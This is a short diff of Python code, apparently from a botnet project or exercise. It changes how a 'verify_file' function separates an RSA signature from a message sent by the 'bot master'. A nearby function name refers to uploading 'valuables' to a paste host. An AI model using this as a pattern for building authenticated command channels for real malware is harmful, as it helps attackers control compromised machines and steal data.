@@ -41,9 +41,8 @@ def upload_valuables_to_pastebot(fn):
 
 def verify_file(f):
     # Verify the file was sent by the bot master
-    lines = f.split(bytes("\n", "ascii"), 1)
-    signature = lines[0]
-    message = lines[1]
+    signature = f[:256]
+    message = f[256:]
     # Read in the private key
     key = RSA.importKey(open(os.path.join("pastebot.net", "master_rsa.pub")).read())
     
